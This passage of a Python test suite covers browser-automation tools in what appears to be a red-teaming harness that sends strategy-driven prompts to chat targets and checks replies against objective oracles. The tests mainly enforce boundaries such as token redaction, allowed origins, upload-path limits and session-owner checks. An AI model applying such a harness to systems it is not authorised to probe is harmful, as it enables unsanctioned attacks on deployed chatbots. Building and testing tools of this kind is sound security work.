                    method: 'POST',
                    headers: {'content-type': 'application/json'},
                    body: JSON.stringify({message: 'probe', token: 'must-not-leak'})
                })"""
            )
            events = ()
            for _ in range(20):
                events = session.api_exchange_events()
                if events:
                    break
                await asyncio.sleep(0.05)

            assert events[-1]["request_json"] == {
                "message": "probe",
                "token": "[redacted]",
            }
            assert events[-1]["response_json"] == {"reply": "observed response"}
            observed = await session.act(action(session, tab, "network_events"))
            assert "must-not-leak" not in observed.text


@pytest.mark.asyncio
async def test_network_tool_returns_deltas_but_records_complete_observations() -> None:
    class Recorder:
        def __init__(self):
            self.observations = []

        async def append_action(self, _value):
            return None

        async def append_observation(self, value):
            self.observations.append(value)

        async def save_metadata(self, _value):
            return None

        async def record_evidence(self, *_value):
            return None

    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin)
            page = session.context.pages[-1]
            await page.evaluate(
                """async () => fetch('/api/message', {
                    method: 'POST',
                    headers: {'content-type': 'application/json'},
                    body: JSON.stringify({message: 'probe-one'})
                })"""
            )
            for _ in range(20):
                if session.api_exchange_events():
                    break
                await asyncio.sleep(0.05)
            recorder = Recorder()
            tool = next(
                candidate
                for candidate in browser_tools(lambda _: session, recorder)
                if candidate.describe().name == "browser_network_events"
            )
            context = ToolContext(session_id="s1", workspace_root="/tmp", agent_id="recon")

            first = await tool.invoke(context, {"tab_ref": tab})
            second = await tool.invoke(context, {"tab_ref": tab})
            first_observation = json.loads(first.content.splitlines()[0])
            second_observation = json.loads(second.content.splitlines()[0])
            assert "probe-one" in first_observation["text"]
            assert json.loads(second_observation["text"]) == []
            assert "No new network events" in second.content
            assert len(recorder.observations) == 2
            assert "probe-one" in recorder.observations[0].text
            assert "probe-one" in recorder.observations[1].text

            await page.evaluate(
                """async () => fetch('/api/message', {
                    method: 'POST',
                    headers: {'content-type': 'application/json'},
                    body: JSON.stringify({message: 'probe-two'})
                })"""
            )
            for _ in range(20):
                if any(
                    event.get("request_json", {}).get("message") == "probe-two"
                    for event in session.api_exchange_events()
                ):
                    break
                await asyncio.sleep(0.05)
            third = await tool.invoke(context, {"tab_ref": tab})
            third_observation = json.loads(third.content.splitlines()[0])
            assert "probe-two" in third_observation["text"]
            assert "probe-one" not in third_observation["text"]
            assert "probe-one" in recorder.observations[-1].text
            assert "probe-two" in recorder.observations[-1].text


@pytest.mark.asyncio
async def test_network_delta_summarizes_every_endpoint_beyond_full_body_bound() -> None:
    events = [
        {
            "method": "POST",
            "url": f"https://target.test/api/{index}",
            "status": 200 + index,
            "request_json": {"message": f"body-{index}"},
            "response_json": {"reply": f"reply-{index}"},
        }
        for index in range(15)
    ]
    observation = BrowserObservation(
        context_id="browser-context",
        target_id="target",
        origin="https://target.test",
        owner=owner(),
        tab_ref="tab:network",
        kind="network",
        text=json.dumps(events),
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        async def act(self, _action, *, actor_id):
            assert actor_id == "recon"
            return observation

        def metadata(self, *, restart):
            assert restart is True
            return SimpleNamespace()

        def api_exchange_events(self):
            return ()

    class Recorder:
        def __init__(self):
            self.observations = []

        async def append_action(self, _value):
            return None

        async def append_observation(self, value):
            self.observations.append(value)

        async def save_metadata(self, _value):
            return None

        async def record_evidence(self, *_value):
            return None

    recorder = Recorder()
    tool = next(
        candidate
        for candidate in browser_tools(lambda _: Session(), recorder)
        if candidate.describe().name == "browser_network_events"
    )
    result = await tool.invoke(
        ToolContext(session_id="s1", workspace_root="/tmp", agent_id="recon"),
        {"tab_ref": "tab:network"},
    )

    assert result.metadata["network_delta"] == {
        "new_events": 15,
        "full_events_shown": 12,
        "endpoint_summaries_shown": 3,
        "complete_evidence_durable": True,
    }
    for index in range(15):
        assert f"https://target.test/api/{index}" in result.content
    assert '"method":"POST"' in result.content
    assert '"status":200' in result.content
    assert "browser_compile_api_handoff; the compiler reads the durable capture" in result.content
    assert '"request_schema":{"candidate_text_pointers":["/message"]' in result.content
    assert '"response_schema":{"candidate_text_pointers":["/reply"]' in result.content
    assert len(recorder.observations) == 1
    assert "body-0" in recorder.observations[0].text
    assert "body-14" in recorder.observations[0].text


@pytest.mark.asyncio
async def test_network_tool_hands_structured_api_recon_to_compiler() -> None:
    class Recorder:
        async def append_action(self, _value):
            return None

        async def append_observation(self, _value):
            return None

        async def save_metadata(self, _value):
            return None

        async def record_evidence(self, *_value):
            return None

    async def allow(*_arguments):
        return "allow_once"

    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin)
            await session.context.pages[-1].evaluate(
                """async () => fetch('/api/message', {
                    method: 'POST',
                    headers: {'content-type': 'application/json'},
                    body: JSON.stringify({message: 'probe'})
                })"""
            )
            for _ in range(20):
                if session.api_exchange_events():
                    break
                await asyncio.sleep(0.05)
            broker = ToolBroker(
                browser_tools(lambda _: session, Recorder()),
                confirmer=allow,
            )

            result = await broker.invoke(
                "browser_network_events",
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {"tab_ref": tab},
            )

            assert result.is_error is False
            assert "preferred_next_tool" not in result.metadata
            assert "cleanup_discovery.status=required_before_target_execution" not in result.content


@pytest.mark.asyncio
async def test_identical_failed_browser_action_is_bounded_and_recorded() -> None:
    class Recorder:
        def __init__(self):
            self.actions = []

        async def append_action(self, value):
            self.actions.append(value)

        async def save_metadata(self, value):
            self.metadata = value

        async def append_observation(self, value):
            raise AssertionError(value)

        async def record_evidence(self, *value):
            raise AssertionError(value)

    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin)
            recorder = Recorder()
            click = next(
                tool
                for tool in browser_tools(lambda _: session, recorder)
                if tool.name == "browser_click"
            )
            context = ToolContext(session_id="s1", workspace_root="/tmp", agent_id="worker-1")
            arguments = {"tab_ref": tab, "element_ref": "missing", "step": 1}
            first = await click.invoke(context, arguments)
            second = await click.invoke(context, arguments)
            blocked = await click.invoke(context, arguments)
            assert first.is_error and second.is_error and blocked.is_error
            assert "failed twice" in blocked.content
            fresh_session = await click.invoke(
                ToolContext(session_id="s2", workspace_root="/tmp", agent_id="worker-1"),
                arguments,
            )
            assert fresh_session.is_error
            assert "failed twice" not in fresh_session.content
            assert len(recorder.actions) == 4


@pytest.mark.asyncio
async def test_owned_session_cleanup_clicks_only_exact_visible_ending_control() -> None:
    class Recorder:
        def __init__(self):
            self.actions, self.observations, self.evidence = [], [], []

        async def append_action(self, value):
            self.actions.append(value)

        async def append_observation(self, value):
            self.observations.append(value)

        async def record_evidence(self, *value):
            self.evidence.append(value)

        async def save_metadata(self, value):
            self.metadata = value

        async def list_actions(self, context_id):
            return tuple(item for item in self.actions if item.context_id == context_id)

        async def list_observations(self, context_id):
            return tuple(item for item in self.observations if item.context_id == context_id)

        async def list_handoffs(self, _target_id, limit=20):
            del limit
            adapter = json.dumps(
                {
                    "interface": "http_api",
                    "cleanup_discovery": {
                        "status": "required_before_target_execution",
                        "session_ownership": "owned",
                    },
                    "session_creation_transition": {
                        "remote_session_id": "owned-bank-session",
                        "evidence_refs": ["browser-action:sha256:" + "a" * 64],
                    },
                },
                sort_keys=True,
                separators=(",", ":"),
            )
            return (
                SimpleNamespace(
                    context_id=session.context_id,
                    owner=session.owner,
                    adapter=adapter,
                ),
            )

    page = (
        b'<button aria-label="Forfeit" '
        b"onclick=\"this.setAttribute('aria-label', 'Session ended')\">Forfeit</button>"
    )
    async with web_fixture(page) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            await session.new_tab(origin)
            recorder = Recorder()
            cleanup = next(
                tool
                for tool in browser_tools(
                    lambda _: session,
                    recorder,
                    state_scope_store=_StateScopeFixtureStore(),
                )
                if tool.name == "browser_end_owned_session"
            )
            result = await cleanup.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp", agent_id="a1"),
                {"step": 7},
            )

            assert result.is_error is False
            assert result.metadata["owned_session_cleanup"] is True
            assert result.metadata["cleanup_control"] == "Forfeit"
            assert result.metadata["owned_remote_session_id"] == "owned-bank-session"
            assert result.metadata["preferred_next_tool"] == "browser_compile_api_handoff"
            assert result.metadata["state_owner_kind"] == "session_browser_context"
            assert result.metadata["state_owner_id"] == f"browser:{session.context_id}"
            assert result.metadata["state_evidence_durable"] is True
            assert len(recorder.actions) == 1
            assert recorder.actions[0].kind == "click"
            assert [item.kind for item in recorder.observations] == ["snapshot", "snapshot"]
            action = recorder.actions[0].model_copy(update={"frame_ref": None})
            action_ref = BrowserSession._evidence(action)  # noqa: SLF001
            recorder.actions[0] = action
            recorder.observations[-1] = recorder.observations[-1].model_copy(
                update={"evidence_refs": (action_ref,)}
            )
            assert action.frame_ref is None
            assert recorder.observations[0].frame_ref == "main"
            cleanup_observed_at = action.created_at + timedelta(microseconds=1)
            reviewed = await _reviewed_cleanup_action(
                session,
                recorder,  # type: ignore[arg-type]
                {"observed_at": cleanup_observed_at.isoformat()},
                action_ref,
            )
            assert reviewed is not None
            assert reviewed[1]["kind"] == "click"


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "page",
    (
        b'<button aria-label="Cancel payment">Cancel payment</button>',
        b'<button aria-label="End session" disabled>End session</button>',
        (
            b'<button aria-label="Forfeit">Forfeit</button>'
            b'<button aria-label="End session">End session</button>'
        ),
    ),
)
async def test_owned_session_cleanup_rejects_ambiguous_or_non_session_controls(page) -> None:
    async with web_fixture(page) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            await session.new_tab(origin)
            cleanup = next(
                tool
                for tool in browser_tools(lambda _: session)
                if tool.name == "browser_end_owned_session"
            )
            result = await cleanup.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp", agent_id="a1"),
                {},
            )

            assert result.is_error is True
            assert "exactly one visible, enabled session-ending button" in result.content


@pytest.mark.asyncio
async def test_owned_session_cleanup_rejects_a_different_session_owner() -> None:
    async with web_fixture(b'<button aria-label="Forfeit">Forfeit</button>') as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            await session.new_tab(origin)
            cleanup = next(
                tool
                for tool in browser_tools(lambda _: session)
                if tool.name == "browser_end_owned_session"
            )
            result = await cleanup.invoke(
                ToolContext(session_id="other-session", workspace_root="/tmp", agent_id="a1"),
                {},
            )

            assert result.is_error is True
            assert "browser session owner does not match" in result.content


@pytest.mark.asyncio
async def test_owned_session_cleanup_rejects_campaign_workers_before_snapshot() -> None:
    class Recorder:
        def __init__(self):
            self.actions, self.observations = [], []

        async def append_action(self, value):
            self.actions.append(value)

        async def append_observation(self, value):
            self.observations.append(value)

    async with web_fixture(b'<button aria-label="Forfeit">Forfeit</button>') as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            await session.new_tab(origin)
            recorder = Recorder()
            cleanup = next(
                tool
                for tool in browser_tools(lambda _: session, recorder)  # type: ignore[arg-type]
                if tool.name == "browser_end_owned_session"
            )
            result = await cleanup.invoke(
                ToolContext(
                    session_id="s1",
                    workspace_root="/tmp",
                    agent_id="a1",
                    campaign_id="campaign/active",
                ),
                {},
            )

            assert result.is_error is True
            assert result.metadata["campaign_scoped"] is True
            assert "campaign workers cannot end" in result.content
            assert recorder.actions == []
            assert recorder.observations == []


@pytest.mark.asyncio
async def test_owned_session_cleanup_rejects_model_selected_or_multiple_tabs() -> None:
    async with web_fixture(b'<button aria-label="Forfeit">Forfeit</button>') as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            await session.new_tab(origin)
            await session.new_tab(origin)
            cleanup = next(
                tool
                for tool in browser_tools(lambda _: session)
                if tool.name == "browser_end_owned_session"
            )

            schema = cleanup.describe().input_schema
            assert "tab_ref" not in schema["properties"]
            selected = await cleanup.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp", agent_id="a1"),
                {"tab_ref": "tab:chosen"},
            )
            multiple = await cleanup.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp", agent_id="a1"),
                {},
            )

            assert selected.is_error is True
            assert "arguments do not match" in selected.content
            assert multiple.is_error is True
            assert "exactly one open reviewed browser tab; found 2" in multiple.content


@pytest.mark.asyncio
async def test_failed_browser_action_captures_bounded_diagnostics(tmp_path, monkeypatch) -> None:
    class Recorder:
        def __init__(self):
            self.actions, self.observations, self.evidence = [], [], []

        async def append_action(self, value):
            self.actions.append(value)

        async def save_metadata(self, value):
            self.metadata = value

        async def append_observation(self, value):
            self.observations.append(value)

        async def record_evidence(self, *value):
            self.evidence.append(value)

    monkeypatch.setattr(Path, "home", classmethod(lambda cls: tmp_path))
    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin)
            snapshot = await session.snapshot(tab)
            button = next(item for item in snapshot.elements if item.role == "button")

            async def stalled_action(*_args, **_kwargs):
                await asyncio.Event().wait()

            monkeypatch.setattr(session, "act", stalled_action)
            recorder = Recorder()
            click = next(
                tool
                for tool in browser_tools(lambda _: session, recorder)
                if tool.name == "browser_click"
            )
            result = await click.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp", agent_id="worker-1"),
                {
                    "tab_ref": tab,
                    "element_ref": button.ref,
                    "step": 3,
                    "timeout_ms": 100,
                },
            )

            assert result.is_error
            assert "TimeoutError" in result.content
            assert "Automatic failure diagnostics" in result.content
            assert '"screenshot"' in result.content
            assert [item.kind for item in recorder.observations] == ["snapshot", "network"]
            assert recorder.evidence[0][2] == "browser_failure_screenshot"
            assert result.metadata["diagnostic_screenshot"] == recorder.evidence[0][3]
            screenshot = Path(recorder.evidence[0][3]["path"])
            assert await asyncio.to_thread(screenshot.is_file)
            screenshot_stat = await asyncio.to_thread(screenshot.stat)
            assert screenshot_stat.st_mode & 0o777 == 0o600


@pytest.mark.asyncio
async def test_browser_service_persists_takeover_cleanup_and_resume() -> None:
    class MetadataStore:
        def __init__(self):
            self.items = {}

        async def save_metadata(self, value):
            self.items[value.context_id] = value

        async def load_metadata(self, context_id):
            return self.items.get(context_id)

        async def list_metadata(self, session_id):
            return [item for item in self.items.values() if item.owner.session_id == session_id]

        async def list_actions(self, _context_id):
            return [SimpleNamespace(kind="press", evidence_refs=("action-ref",))]

        async def list_observations(self, _context_id):
            return [
                SimpleNamespace(
                    text="FareCare response completed",
                    evidence_refs=("response-ref",),
                )
            ]

    async with web_fixture() as origin:
        store = MetadataStore()

        async def targets(_):
            return BrowserBounds(target_id="target", allowed_origins={origin})

        service = BrowserService(store, targets)
        live = await service.for_tool("s1")
        tab = await live.new_tab(origin)
        context_id = live.context_id
        await service.takeover("s1", context_id)
        listed = (await service.list_contexts("s1"))[0]
        assert listed["worker_id"] == "operator"
        assert listed["latest_action"] == "press"
        assert listed["latest_observation"] == "FareCare response completed"
        assert listed["evidence"] == ("action-ref", "response-ref")
        await service.close()
        assert store.items[context_id].state == "restart_required"

        restarted = BrowserService(store, targets)
        await restarted.resume("s1", context_id)
        assert (await restarted.list_tabs("s1", context_id))[0]["tab_ref"] == tab
        cleaned = await restarted.cleanup("s1", context_id)
        assert cleaned["state"] == "cleaned"


@pytest.mark.asyncio
async def test_closed_browser_service_cannot_spawn_new_processes() -> None:
    class MetadataStore:
        async def save_metadata(self, _value):
            return None

        async def load_metadata(self, _context_id):
            return None

        async def list_metadata(self, _session_id):
            return ()

    target_resolutions = 0

    async def targets(_session_id):
        nonlocal target_resolutions
        target_resolutions += 1
        return BrowserBounds(target_id="target", allowed_origins={"https://target.test"})

    service = BrowserService(MetadataStore(), targets)
    await service.close()
    await service.close()

    with pytest.raises(BrowserBoundaryError, match="shutting down"):
        await service.for_tool("session")
    with pytest.raises(BrowserBoundaryError, match="shutting down"):
        await service.for_reviewed_persistent(
            "session",
            BrowserBounds(
                target_id="target",
                allowed_origins={"https://target.test"},
                requires_persistent_profile=True,
            ),
        )
    assert target_resolutions == 0


@pytest.mark.asyncio
async def test_browser_service_uses_configured_shared_profile_directly(tmp_path: Path) -> None:
    class MetadataStore:
        def __init__(self):
            self.items = {}

        async def save_metadata(self, value):
            self.items[value.context_id] = value

        async def load_metadata(self, _context_id):
            return None

        async def list_metadata(self, session_id):
            return [item for item in self.items.values() if item.owner.session_id == session_id]

    async with web_fixture() as origin:

        async def targets(_session_id):
            return BrowserBounds(
                target_id="target-with-auth",
                allowed_origins={origin},
                max_tabs=1,
                requires_persistent_profile=True,
            )

        profile = tmp_path / "shared-profile"
        store = MetadataStore()
        service = BrowserService(
            store, targets, persistent_profile=profile, persistent_headless=True
        )
        first = await service.for_tool("worker-1")
        assert first.owner.session_id == "worker-1"
        stale = first.metadata(restart=True).model_copy(
            update={
                "context_id": "stale-worker-2-context",
                "owner": first.owner.model_copy(update={"session_id": "worker-2"}),
            }
        )
        await store.save_metadata(stale)
        second = await service.for_tool("worker-2")
        assert first.context_id == second.context_id
        assert second.owner.session_id == "worker-2"
        assert store.items[stale.context_id].state == "cleaned"
        assert store.items[second.context_id].owner.session_id == "worker-2"
        reviewed = await service.for_reviewed_persistent(
            "promotion-session",
            BrowserBounds(
                target_id="promotion:reviewed-adapter",
                allowed_origins={origin},
                max_tabs=1,
                requires_persistent_profile=True,
            ),
        )
        assert reviewed.context_id == first.context_id
        first_tab = await first.new_tab(f"{origin}/one")
        second_tab = await second.new_tab(f"{origin}/two")
        assert first_tab == second_tab
        assert len(first.metadata().tabs) == 1
        assert not (profile / "target-with-auth").exists()
        await service.close()


@pytest.mark.asyncio
async def test_persistent_browser_reopens_after_only_tab_was_closed(tmp_path: Path) -> None:
    async with web_fixture() as origin:
        bounds = BrowserBounds(
            target_id="target-with-auth",
            allowed_origins={origin},
            max_tabs=1,
            requires_persistent_profile=True,
        )
        async with await launch_persistent(
            tmp_path / "shared-profile",
            bounds,
            owner(),
            headless=True,
        ) as session:
            stale_tab = await session.new_tab(origin)
            await session._tabs[stale_tab].close()

            replacement_tab = await session.new_tab(origin)

            assert replacement_tab != stale_tab
            assert tuple(tab.tab_ref for tab in session.metadata().tabs) == (replacement_tab,)


@pytest.mark.asyncio
async def test_restarted_persistent_browser_recovers_obsolete_ref_for_only_live_tab(
    tmp_path: Path,
) -> None:
    async with web_fixture() as origin:
        bounds = BrowserBounds(
            target_id="target-with-auth",
            allowed_origins={origin},
            max_tabs=1,
            requires_persistent_profile=True,
        )
        profile = tmp_path / "shared-profile"
        session = await launch_persistent(profile, bounds, owner(), headless=True)
        await session.new_tab(origin)
        metadata = session.metadata(restart=True)
        await session.close()

        restarted = await restart_persistent(
            metadata,
            bounds,
            owner(),
            profile,
            headless=True,
        )
        try:
            obsolete_ref = "tab:durable-before-runtime-rotation"
            observation = await restarted.snapshot(obsolete_ref)

            assert observation.tab_ref == obsolete_ref
            assert "Run" in observation.text
            assert tuple(tab.tab_ref for tab in restarted.metadata().tabs) == (obsolete_ref,)
        finally:
            await restarted.close()


@pytest.mark.asyncio
async def test_persistent_browser_refuses_obsolete_ref_with_multiple_live_tabs(
    tmp_path: Path,
) -> None:
    async with web_fixture() as origin:
        bounds = BrowserBounds(
            target_id="target-with-auth",
            allowed_origins={origin},
            max_tabs=2,
            requires_persistent_profile=True,
        )
        profile = tmp_path / "shared-profile"
        session = await launch_persistent(profile, bounds, owner(), headless=True)
        await session.new_tab(origin)
        await session.context.new_page()
        metadata = session.metadata(restart=True)
        await session.close()

        restarted = await restart_persistent(
            metadata,
            bounds,
            owner(),
            profile,
            headless=True,
        )
        try:
            await restarted.context.new_page()
            with pytest.raises(StaleReference, match="tab reference is stale"):
                await restarted.snapshot("tab:obsolete")
        finally:
            await restarted.close()


@pytest.mark.asyncio
async def test_isolated_browser_refuses_obsolete_ref_with_one_live_tab() -> None:
    async with web_fixture() as origin:
        bounds = BrowserBounds(target_id="target", allowed_origins={origin})
        async with await launch_isolated(bounds, owner()) as session:
            await session.new_tab(origin)
            with pytest.raises(StaleReference, match="tab reference is stale"):
                await session.snapshot("tab:obsolete")


@pytest.mark.asyncio
async def test_persistent_browser_serializes_workers_until_terminal_release(tmp_path: Path) -> None:
    async with web_fixture() as origin:
        bounds = BrowserBounds(
            target_id="target-with-auth",
            allowed_origins={origin},
            requires_persistent_profile=True,
        )
        async with await launch_persistent(
            tmp_path / "shared-profile",
            bounds,
            owner(),
            headless=True,
            actor_wait_seconds=0.05,
        ) as session:
            tab = await session.new_tab(origin)
            browser_action = action(session, tab, "snapshot").model_copy(
                update={"target_id": bounds.target_id}
            )

            await session.act(browser_action, actor_id="worker-1")
            assert session.metadata().active_actor_id == "worker-1"
            with pytest.raises(BrowserBoundaryError, match="busy with another campaign worker"):
                await session.act(browser_action, actor_id="worker-2")

            await session.release_actor("worker-1")
            assert session.metadata().active_actor_id is None
            observation = await session.act(browser_action, actor_id="worker-2")
            assert observation.kind == "snapshot"


@pytest.mark.asyncio
async def test_browser_service_recovers_persistent_profile_with_durable_tab_ids(
    tmp_path: Path,
) -> None:
    class MetadataStore:
        def __init__(self):
            self.items = {}

        async def save_metadata(self, value):
            self.items[value.context_id] = value

        async def load_metadata(self, context_id):
            return self.items.get(context_id)

        async def list_metadata(self, session_id):
            return [item for item in self.items.values() if item.owner.session_id == session_id]

    async with web_fixture() as origin:
        store = MetadataStore()

        async def targets(_session_id):
            return BrowserBounds(
                target_id="target-with-auth",
                allowed_origins={origin},
                requires_persistent_profile=True,
            )

        profile = tmp_path / "shared-profile"
        service = BrowserService(
            store,
            targets,
            persistent_profile=profile,
            persistent_headless=True,
        )
        live = await service.for_tool("s1")
        tab = await live.new_tab(origin)
        context_id = live.context_id
        await service.close()
        assert store.items[context_id].state == "restart_required"

        restarted = BrowserService(
            store,
            targets,
            persistent_profile=profile,
            persistent_headless=True,
        )
        automatically_resumed = await restarted.for_tool("s1")
        assert automatically_resumed.context_id == context_id
        assert (await restarted.list_tabs("s1", context_id))[0]["tab_ref"] == tab
        assert (await restarted.for_tool("s1")).context_id == context_id
        await restarted.cleanup("s1", context_id)


@pytest.mark.asyncio
async def test_browser_service_refuses_ambiguous_automatic_recovery(tmp_path: Path) -> None:
    class MetadataStore:
        def __init__(self):
            self.items = {}

        async def save_metadata(self, value):
            self.items[value.context_id] = value

        async def load_metadata(self, context_id):
            return self.items.get(context_id)

        async def list_metadata(self, session_id):
            return [item for item in self.items.values() if item.owner.session_id == session_id]

    async with web_fixture() as origin:
        store = MetadataStore()

        async def targets(_session_id):
            return BrowserBounds(
                target_id="target-with-auth",
                allowed_origins={origin},
                requires_persistent_profile=True,
            )

        profile = tmp_path / "shared-profile"
        first_service = BrowserService(
            store, targets, persistent_profile=profile, persistent_headless=True
        )
        first = await first_service.for_tool("s1")
        await first.new_tab(origin)
        first_metadata = first.metadata(restart=True)
        await first_service.close()
        duplicate = first_metadata.model_copy(update={"context_id": "duplicate-context"})
        await store.save_metadata(duplicate)

        restarted = BrowserService(
            store, targets, persistent_profile=profile, persistent_headless=True
        )
        with pytest.raises(BrowserBoundaryError, match="multiple durable browser contexts"):
            await restarted.for_tool("s1")


@pytest.mark.asyncio
async def test_upload_requires_explicit_path_bound(tmp_path: Path) -> None:
    upload = tmp_path / "allowed.txt"
    upload.write_text("evidence", encoding="utf-8")
    other = tmp_path / "other.txt"
    other.write_text("blocked", encoding="utf-8")
    async with web_fixture(b'<input type="file" aria-label="Evidence file">') as origin:
        bounds = BrowserBounds(
            target_id="target",
            allowed_origins={origin},
            allow_uploads=True,
            allowed_upload_paths={str(upload)},
        )
        async with await launch_isolated(bounds, owner()) as session:
            tab = await session.new_tab(origin)
            element = next(
                item for item in (await session.snapshot(tab)).elements if item.role == "file"
            )
            await session.act(
                action(
                    session,
                    tab,
                    "upload",
                    element_ref=element.ref,
                    value=str(upload),
                )
            )
            with pytest.raises(BrowserBoundaryError, match="upload path"):
                await session.act(
                    action(
                        session,
                        tab,
                        "upload",
                        element_ref=element.ref,
                        value=str(other),
                    )
                )


def test_api_handoff_requires_adapter_or_explicit_dom_fallback() -> None:
    values = {
        "id": "handoff-1",
        "context_id": "context-1",
        "target_id": "target",
        "owner": owner(),
        "method": "GET",
        "url": "https://target.test/api",
        "request_evidence_ref": "evidence://request",
        "response_evidence_ref": "evidence://response",
    }
    adapter = '{"interface":"http_api"}'
    assert ApiReconHandoff(**values, adapter=adapter).adapter == adapter
    assert (
        "DOM"
        in ApiReconHandoff(
            **values, dom_fallback_reason="DOM-only state transition"
        ).dom_fallback_reason
    )
    with pytest.raises(ValueError, match="requires an API adapter or DOM fallback"):
        ApiReconHandoff(**values)
    dual = ApiReconHandoff(**values, adapter=adapter, dom_fallback_reason="retained as evidence")
    assert dual.adapter == adapter
    assert dual.dom_fallback_reason == "retained as evidence"
    with pytest.raises(ValueError, match="canonical JSON"):
        ApiReconHandoff(**values, adapter="openapi")


def test_api_handoff_normalizes_legacy_compiled_adapter_defaults() -> None:
    from merlin_contracts.target_adapter_compiler import (
        compile_target_adapter,
        compiled_target_adapter_digest,
    )

    adapter = {
        "interface": "http_api",
        "endpoint": "https://target.test/chat",
        "api_steps": [
            {
                "method": "POST",
                "interaction": True,
                "request_template": {"message": "{{input}}"},
            }
        ],
    }
    compilation = compile_target_adapter(adapter)
    legacy_compiled = compilation.model_dump(mode="json")
    for step in legacy_compiled["executable"]["steps"]:
        step.pop("request_bindings")
    legacy_serialized = json.dumps(legacy_compiled, sort_keys=True, separators=(",", ":"))
    canonical_serialized = json.dumps(
        compilation.model_dump(mode="json"),
        sort_keys=True,
        separators=(",", ":"),
    )

    handoff = ApiReconHandoff(
        id="handoff-legacy-compiled",
        context_id="context-1",
        target_id="target",
        owner=owner(),
        method="POST",
        url="https://target.test/chat",
        request_evidence_ref="evidence://request",
        response_evidence_ref="evidence://response",
        adapter=json.dumps(adapter, sort_keys=True, separators=(",", ":")),
        compiled_adapter=legacy_serialized,
        compiled_adapter_digest=compiled_target_adapter_digest(compilation),
    )

    assert handoff.compiled_adapter == canonical_serialized


@pytest.mark.asyncio
async def test_compiled_chat_exchange_records_adaptive_exchange_with_typed_oracle() -> None:
    import hashlib

    chat = b"""
    <textarea aria-label="Message" maxlength="500"></textarea>
    <button aria-label="Send" onclick="
      document.getElementById('reply').textContent=
        'assistant:'+document.querySelector('textarea').value;
    ">Send</button>
    <div id="reply" aria-live="polite"></div>
    """

    class Recorder:
        async def append_action(self, _value):
            return None

        async def append_observation(self, _value):
            return None

        async def record_evidence(self, *_value):
            return None

        async def save_metadata(self, _value):
            return None

    async with web_fixture(chat) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin)
            snapshot = await session.snapshot(tab)
            message = next(item for item in snapshot.elements if item.name == "Message")
            send = next(item for item in snapshot.elements if item.name == "Send")
            adapter = reviewed_browser_adapter(origin)
            adapter["browser_steps"] = [
                {
                    "step_id": "fill",
                    "tool": "browser_fill",
                    "arguments": {"element_ref": message.ref},
                },
                {
                    "step_id": "submit",
                    "tool": "browser_click",
                    "arguments": {"element_ref": send.ref},
                },
            ]
            adapter["interaction_contract"]["oracle_predicate"] = {
                "oracle_digest": "sha256:" + "1" * 64,
                "pointer": "/text",
                "match_values": ["page text that cannot match"],
                "modality": "text",
                "turn": "multi",
                "language": "en",
            }

            async def allow(*_):
                return True

            broker = ToolBroker(
                browser_tools(lambda _: session, Recorder(), lambda _: adapter),
                confirmer=allow,
            )
            result = await broker.invoke(
                "browser_chat_exchange",
                ToolContext(session_id="s1", workspace_root="/tmp", campaign_id="campaign:test"),
                {
                    "prompt": "hello",
                    "strategy_plan": {
                        "observation": "o",
                        "thought": "t",
                        "strategy": ["hypothetical"],
                        "response": "hello",
                    },
                    "strategy_turn_index": 0,
                },
            )

            assert result.is_error is False
            (exchange,) = result.metadata["target_exchanges"]
            assert exchange["id"] == "chat-exchange"
            assert exchange["interaction"] is True
            assert exchange["request"] == {"prompt": "hello"}
            assert "assistant:hello" in exchange["response"]
            (observation,) = exchange["oracle_observations"]
            assert observation["schema"] == "merlin.api-oracle-observation.v2"
            assert observation["purpose"] == "objective"
            assert observation["matched"] is False
            assert observation["turn"] == "multi"
            adapter_digest = executable_adapter_digest(adapter)
            assert observation["adapter_digest"] == adapter_digest
            binding = {
                key: observation[key]
                for key in (
                    "adapter_digest",
                    "step_id",
                    "oracle_digest",
                    "pointer",
                    "match_values",
                    "modality",
                    "turn",
                    "language",
                    "purpose",
                )
            }

            def digest_of(value: object) -> str:
                encoded = json.dumps(value, sort_keys=True, separators=(",", ":")).encode()
                return "sha256:" + hashlib.sha256(encoded).hexdigest()

            assert observation["binding_digest"] == digest_of(binding)
            unsigned = {
                key: item for key, item in observation.items() if key != "observation_digest"
            }
            assert observation["observation_digest"] == digest_of(unsigned)
            assert exchange["oracle_observation"] is observation


@pytest.mark.asyncio
async def test_compiled_chat_exchange_waits_for_complete_multi_message_boundary() -> None:
    chat = b"""
    <textarea aria-label="Message" maxlength="500"></textarea>
    <button aria-label="Send" onclick="
      const reply=document.getElementById('reply');
      reply.textContent='assistant:hello';
      setTimeout(() => reply.textContent += ' assistant:follow-up', 250);
    ">Send</button>
    <div id="reply" aria-live="polite"></div>
    """

    class Recorder:
        async def append_action(self, _value):
            return None

        async def append_observation(self, _value):
            return None

        async def record_evidence(self, *_value):
            return None

        async def save_metadata(self, _value):
            return None

    async with web_fixture(chat) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
